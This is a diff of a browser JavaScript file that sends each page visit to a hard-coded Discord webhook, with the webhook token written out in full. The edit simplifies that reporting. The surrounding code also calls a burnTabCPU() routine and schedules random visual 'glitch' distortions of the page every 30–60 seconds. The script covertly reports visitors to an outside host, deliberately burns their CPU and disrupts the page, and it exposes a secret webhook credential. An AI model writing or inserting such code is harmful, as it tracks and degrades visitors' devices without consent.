@@ -1,41 +1,17 @@
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1351937979718959137/n4gj7STURnoohr5DCKzGE-nFHLp6U19b-jh7wQRSotlb-hogaJf_Ztf80s0BbZigAtGb";
 
-// Simple UA check for mobile vs desktop
-function getDeviceType() {
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  // Common mobile indicators
-  if (/Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(ua)) {
-    return "Mobile";
-  }
-  return "Desktop";
-}
-
 function sendVisitToDiscord(url) {
   const now = new Date();
-  const timestampLocal = now.toLocaleString();
-  const timestampISO = now.toISOString();
-  const pageTitle = document.title || url;
-  const device = getDeviceType();
+  const timestampLocal = now.toLocaleString();       // e.g. "7/6/2025, 8:13:14 PM"
+  const timestampISO = now.toISOString();             // for embed.timestamp
 
   const payload = {
     embeds: [
       {
-        // Use the page title as embed title
-        title: `🌐 Visited: ${pageTitle}`,
+        title: "🌐 New Page Visit",
         url: url,
-        fields: [
-          {
-            name: "🖥️ Device",
-            value: device,
-            inline: true
-          },
-          {
-            name: "🕒 Time",
-            value: timestampLocal,
-            inline: true
-          }
-        ],
-        color: 0x00AE86,
+        description: `🕒 Visited at ${timestampLocal}`,
+        color: 0x00AE86,       // change to any hex color you like
         timestamp: timestampISO
       }
     ]
@@ -45,7 +21,9 @@ function sendVisitToDiscord(url) {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
-  }).catch(err => console.error("❌ Failed to send to Discord:", err));
+  }).catch(err => {
+    console.error("❌ Failed to send to Discord:", err);
+  });
 }
 
 // Only send once per page load
@@ -78,6 +56,7 @@ burnTabCPU();
 function glitchUI() {
   const body = document.body;
 
+  // Insert style & SVG filter once
   if (!document.getElementById('glitch-style')) {
     const style = document.createElement('style');
     style.id = 'glitch-style';
@@ -118,16 +97,20 @@ function glitchUI() {
   }
 
   body.classList.add('glitch-effect');
-  setTimeout(() => body.classList.remove('glitch-effect'), 500);
+  setTimeout(() => {
+    body.classList.remove('glitch-effect');
+  }, 500);
 }
 
-(function startRandomGlitch() {
-  function scheduleNext() {
+// Trigger glitch every 30–60 seconds randomly
+function startRandomGlitch() {
+  (function scheduleNext() {
     const delay = 30000 + Math.random() * 30000;
     setTimeout(() => {
       glitchUI();
       scheduleNext();
     }, delay);
-  }
-  scheduleNext();
-})();
+  })();
+}
+
+startRandomGlitch();
